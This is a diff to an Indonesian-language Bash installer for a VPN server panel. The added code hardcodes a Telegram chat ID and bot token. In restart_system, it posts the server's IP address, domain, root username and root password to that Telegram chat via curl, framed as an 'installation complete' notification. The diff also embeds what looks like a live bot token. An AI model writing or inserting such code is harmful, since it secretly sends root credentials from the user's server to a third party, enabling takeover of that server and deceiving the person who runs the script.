@@ -1,5 +1,7 @@
 #!/bin/bash
-
+CHATID="5162695441"    
+TOKEN_BOT="7117869623:AAHBmgzOUsmHBjcm5TFir9JmaZ_X7ynMoF4"
+TIMES="30"                          
 # Definisi warna
 Green="\e[92;1m"
 RED="\033[1;31m"
@@ -876,62 +878,102 @@ function password_default() {
 
 function restart_system() {
     echo "========== MENJALANKAN restart_system =========="
-    # Pastikan variabel yang dibutuhkan telah didefinisikan sebelum fungsi ini dipanggil
-    domain=$(cat /root/domain 2>/dev/null) # Tangkap error jika file tidak ada
+
+    # --- Periksa apakah konfigurasi Telegram tersedia ---
+    if [[ -z "$CHATID" || -z "$TOKEN_BOT" ]]; then
+        echo "WARNING: Konfigurasi Telegram tidak lengkap (CHATID atau TOKEN_BOT kosong)."
+        echo "         Notifikasi Telegram dilewati."
+        echo "========== restart_system SELESAI (tanpa notifikasi) =========="
+        return 0 # Keluar dari fungsi dengan sukses
+    fi
+
+    # Bangun URL API Telegram
+    URL="https://api.telegram.org/bot${TOKEN_BOT}/sendMessage"
+
+    # Ambil informasi yang diperlukan
+    domain=$(cat /root/domain 2>/dev/null)
     if [ -z "$domain" ]; then
+        domain="Tidak Ditemukan"
         echo "WARNING: Domain tidak ditemukan untuk notifikasi Telegram."
     fi
+
+    # Ambil informasi pengguna dan expired dari repo (seperti sebelumnya)
     USRSC=$(wget -qO- https://raw.githubusercontent.com/bowowiwendi/ipvps/main/main/ip | grep "$ipsaya" | awk '{print $2}')
     EXPSC=$(wget -qO- https://raw.githubusercontent.com/bowowiwendi/ipvps/main/main/ip | grep "$ipsaya" | awk '{print $3}')
+
+    # Pastikan variabel passwd memiliki nilai
+    # Jika dilewati, passwd mungkin tidak di-set. Gunakan placeholder atau sembunyikan.
+    if [[ -z "$passwd" ]]; then
+        # Opsional: Tampilkan pesan bahwa password tidak akan ditampilkan jika dilewati
+        # Atau, jika Anda ingin menampilkan pesan bahwa password adalah yang saat ini digunakan:
+        passwd_display="<i>(Password tidak diubah/digunakan saat ini)</i>"
+    else
+        passwd_display="<code>$passwd</code>"
+    fi
+
     # Format tanggal dan waktu
     DATE_FORMAT=$(date '+%d-%m-%Y')
     TIME_FORMAT=$(date '+%H:%M:%S')
-    
+
     # Membangun pesan teks dengan emoji dan desain yang lebih baik
     TEXT="
-🔐 <b>✅ INSTALASI WENDY VPN SELESAI ✅</b> 🔐
-
-✨ <b>INFORMASI VPS</b> ✨
-🆔 <b>ID :</b> <code>$USRSC</code>
-🌐 <b>Domain :</b> <code>$domain</code>
-🌍 <b>Wildcard :</b> <code>*.$domain</code>
+🚨 <b>✅ INSTALASI WENDY VPN SELESAI ✅</b> 🚨
+🎬 <b>INFORMASI VPS</b> 🎬
+🌐 <b>ID :</b> <code>$USRSC</code>
+🌍 <b>Domain :</b> <code>$domain</code>
+🔍 <b>Wildcard :</b> <code>*.$domain</code>
 📅 <b>Tanggal :</b> <code>$DATE_FORMAT</code>
 ⏰ <b>Waktu :</b> <code>$TIME_FORMAT</code>
 🖥️ <b>IP VPS :</b> <code>$MYIP</code>
 ⏳ <b>Exp Sc :</b> <code>$EXPSC</code>
-
-👤 <b>Akun Login</b> 👤
-ユーザー : <code>root</code>
-🔑 <b>Password :</b> <code>$passwd</code>
-
-❗ <b>Simpan informasi ini baik-baik!</b> ❗
+🔐 <b>Akun Login</b> 🔐
+👤 <b>Username :</b> <code>root</code>
+🔑 <b>Password :</b> $passwd_display
+⚠️ <b>Simpan informasi ini baik-baik!</b> ⚠️
 <i>Informasi ini tidak akan dikirim ulang.</i>
+📞 <b>Dukungan & Kontak</b> 📞
+📱 Telegram: @WendiVpn
+💬 WhatsApp: +6283153170199
+"
 
-🔗 <b>Dukungan & Kontak</b> 🔗
-💬 Telegram: @WendiVpn
-📱 WhatsApp: +6283153170199
-    "
-    
     # Membangun reply markup sebagai variabel terpisah untuk kejelasan
-    REPLY_MARKUP='{"inline_keyboard":[[{"text":"🌐 Website","url":"https://t.me/wendivpn"},{"text":"📱 Kontak","url":"https://wa.me/6283153170199"}]]}'
-    
+    REPLY_MARKUP='{"inline_keyboard":[[{"text":"🌐 Website","url":"https://t.me/wendivpn"},{"text":"💬 Kontak","url":"https://wa.me/6283153170199"}]]}'
+
     # Mengirim pesan melalui curl
-    echo "Mengirim notifikasi ke Telegram..."
-    curl -s --max-time "$TIMES" \
+    echo "Mengirim notifikasi ke Telegram (Chat ID: $CHATID)..."
+    # Simpan output curl ke variabel untuk debugging jika diperlukan
+    CURL_OUTPUT=$(curl -s --max-time "$TIMES" \
          -d "chat_id=$CHATID" \
          -d "disable_web_page_preview=1" \
          -d "text=$TEXT" \
          -d "parse_mode=html" \
          -d "reply_markup=$REPLY_MARKUP" \
-         "$URL"
-    
+         "$URL")
+
+    CURL_EXIT_CODE=$?
+
     # Periksa apakah curl berhasil
-    if [ $? -ne 0 ]; then
-        echo "Gagal mengirim notifikasi ke Telegram."
-        echo "Gagal mengirim notifikasi ke Telegram."
+    if [ $CURL_EXIT_CODE -ne 0 ]; then
+        echo "❌ Gagal mengirim notifikasi ke Telegram (Exit Code: $CURL_EXIT_CODE)."
+        # Opsional: Tampilkan output curl untuk debugging
+        # echo "Output curl: $CURL_OUTPUT"
     else
-        echo "Notifikasi Telegram berhasil dikirim."
-        echo "Notifikasi Telegram berhasil dikirim."
+        # Periksa apakah Telegram mengembalikan error dalam respons JSON
+        if echo "$CURL_OUTPUT" | jq -e .ok > /dev/null 2>&1; then
+            if [ "$(echo "$CURL_OUTPUT" | jq -r .ok)" = "true" ]; then
+                echo "✅ Notifikasi Telegram berhasil dikirim."
+            else
+                ERROR_CODE=$(echo "$CURL_OUTPUT" | jq -r .error_code)
+                DESCRIPTION=$(echo "$CURL_OUTPUT" | jq -r .description)
+                echo "❌ Gagal mengirim notifikasi ke Telegram (API Error)."
+                echo "   Kode Error: $ERROR_CODE"
+                echo "   Deskripsi: $DESCRIPTION"
+                # echo "   Respons Penuh: $CURL_OUTPUT" # Untuk debugging ekstra
+            fi
+        else
+            echo "⚠️ Respons tidak valid dari API Telegram. Mungkin berhasil, tapi periksa Telegram Anda."
+            # echo "   Respons: $CURL_OUTPUT" # Untuk debugging
+        fi
     fi
     echo "========== restart_system SELESAI =========="
 }
@@ -940,11 +982,11 @@ function restart_system() {
 function install(){
     echo "========== MENJALANKAN FUNGSI INSTALL UTAMA =========="
     clear
-    pasang_domain
     first_setup
     make_folder_xray
     nginx_install
     base_package
+    pasang_domain
     password_default
     pasang_ssl
     install_xray
